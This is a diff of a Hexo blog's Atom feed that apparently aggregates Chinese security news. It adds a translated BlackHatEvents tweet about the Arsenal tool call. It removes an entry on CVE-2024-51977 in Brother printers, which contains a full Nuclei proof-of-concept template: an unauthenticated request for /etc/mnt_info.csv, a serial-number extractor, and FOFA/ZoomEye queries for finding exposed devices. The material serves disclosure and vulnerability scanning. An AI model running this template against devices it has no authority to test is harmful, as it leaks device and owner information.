@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-29T11:15:27.650Z</updated>
+  <updated>2025-06-29T12:00:31.299Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>BlackHatEvents twitter update</title>
+    <link href="http://example.com/2025/06/29/twitter_1213651053/"/>
+    <id>http://example.com/2025/06/29/twitter_1213651053/</id>
+    <published>2025-06-29T12:00:31.301Z</published>
+    <updated>2025-06-29T12:00:31.299Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> #BHEU工具征集正式启动！加入我们Arsenal，这是一个激动人心的开源工具展示空间，研究者和开发者齐聚一堂，在充满活力与互动的环境中展示他们的创新项目。在2025年12月10日至11日伦敦这一不容错过的活动中，与充满活力的社区分享你的工具，体验突破性的演示。不要错过成为#网络安全未来一部分的机会 &gt;&gt; <a href="https://t.co/ybLPcp5gaN">https://t.co/ybLPcp5gaN</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1939291004927983683">https://x.com/BlackHatEvents/status/1939291004927983683</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; #BHEU工具征集正式启动！加入我们Arsenal，这是一个激动人心的开源工具展示空间，研究者和开发者齐聚一堂，在充满活力与互动的环境中展示他们的</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
+    
+  </entry>
   
   <entry>
     <title>Oracle WebLogic Server 远程代码执行漏洞</title>
@@ -510,33 +535,6 @@
     
     
     <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Brother Printers 信息泄露漏洞</title>
-    <link href="http://example.com/2025/06/28/github_3206118864/"/>
-    <id>http://example.com/2025/06/28/github_3206118864/</id>
-    <published>2025-06-28T22:45:29.066Z</published>
-    <updated>2025-06-28T22:45:29.063Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Brother Printers 信息泄露漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-51977</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 未经认证的攻击者能够访问HTTP服务（TCP端口80）、HTTPS服务（TCP端口443）或IPP服务（TCP端口631），可以从易受攻击的设备泄露多段敏感信息。通过GET请求访问URI路径&#x2F;etc&#x2F;mnt_info.csv，无需认证。返回的结果是一个逗号分隔值（CSV）信息表。泄露的信息包括设备的型号、固件版本、IP地址和序列号。</p><p><strong>产品厂商：</strong> Brother</p><p><strong>产品名称：</strong> Brother Printers</p><p><strong>搜索语法：</strong> app&#x3D;”brother-Printer”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/99c5dd8d1599e6efc158653438c54e057ca207c2/http%2Fcves%2F2025%2FCVE-2024-51977.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/99c5dd8d1599e6efc158653438c54e057ca207c2/http%2Fcves%2F2025%2FCVE-2024-51977.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">51977</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Brother Printers – Information Disclosure<br>  <span class="hljs-params">author:</span> iamnoooob,darses<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    An unauthenticated attacker who can access either the HTTP service (TCP port <span class="hljs-number">80</span>), the HTTPS service (TCP port <span class="hljs-number">443</span>), <span class="hljs-keyword">or</span> the IPP service (TCP port <span class="hljs-number">631</span>), can leak several pieces of sensitive information from a vulnerable device. The URI path <span class="hljs-symbol">/etc/mnt_info.csv</span> can be accessed via a GET request and no authentication is required. The returned result is a comma separated value (CSV) table of information. The leaked information includes the device’s model, firmware version, IP address, and serial number.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//www.rapid7.com/blog/post/multiple-brother-devices-multiple-vulnerabilities-fixed</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/sfewer-r7/BrotherVulnerabilities</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>support.brother.com<span class="hljs-operator">/</span>g<span class="hljs-operator">/</span>b<span class="hljs-operator">/</span>faqend.aspx<span class="hljs-operator">?</span>c<span class="hljs-operator">=</span>eu_ot&amp;lang<span class="hljs-operator">=</span>en&amp;prod<span class="hljs-operator">=</span>group2&amp;faqid<span class="hljs-operator">=</span>faq00100846_000<br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">5.3</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:L<span class="hljs-operator">/</span>I:N<span class="hljs-operator">/</span>A:N<br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">51977</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">538</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">fofa-query:</span><br>      <span class="hljs-operator">-</span> app<span class="hljs-operator">=</span><span class="hljs-string">&quot;brother-Printer&quot;</span><br>    <span class="hljs-params">zoomeye-query:</span><br>      <span class="hljs-operator">-</span> device<span class="hljs-operator">=</span><span class="hljs-string">&quot;brother-Printer&quot;</span> <span class="hljs-operator">||</span> app<span class="hljs-operator">=</span><span class="hljs-string">&quot;brother-Printer&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2024,brother,exposure<br><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/etc/mnt_info.csv</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> contains_all(body, &#x27;Main Firmware Version&#x27;,&#x27;Model Name&#x27;) <span class="hljs-operator">&amp;&amp;</span> status_code <span class="hljs-operator">==</span> <span class="hljs-number">200</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;(<span class="hljs-char escape_">\w</span>&#123;15&#125;)&quot;</span>&#x27;<br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Brother Printers 信息泄露漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
     
   </entry>
   
